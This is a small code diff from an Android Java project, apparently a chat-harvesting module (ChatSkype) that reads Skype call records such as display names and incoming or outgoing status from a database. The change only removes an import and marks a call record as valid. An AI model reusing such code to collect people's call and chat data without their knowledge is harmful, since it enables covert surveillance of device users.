@@ -22,7 +22,7 @@ import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.manager.ManagerModule;
-import com.android.deviceinfo.module.CallInfo;
+
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
@@ -403,6 +403,7 @@ public class ChatSkype extends SubModuleChat {
 				callInfo.displayName = cursor.getString(2);
 				int type = cursor.getInt(4);
 				callInfo.incoming = cursor.getInt(6) == 1;
+				callInfo.valid = true;
 				
 				return cursor.getLong(0);
 			}
